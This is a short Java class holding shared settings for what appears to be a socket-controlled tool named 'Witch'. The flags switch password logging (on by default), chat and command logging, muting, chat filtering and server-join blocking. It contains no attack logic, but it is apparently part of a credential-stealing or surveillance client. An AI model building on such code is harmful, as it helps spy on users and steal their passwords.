package me.soda.witch.shared.socket.messages;

public class Variables {
    public static final Variables INSTANCE = new Variables();
    public boolean passwordBeingLogged = true;
    public boolean isMuted = false;
    public boolean isBeingFiltered = false;
    public String filterPattern = "";
    public boolean logChatAndCommand = false;
    public boolean canJoinServer = true;
    public String name = "Witch";
}
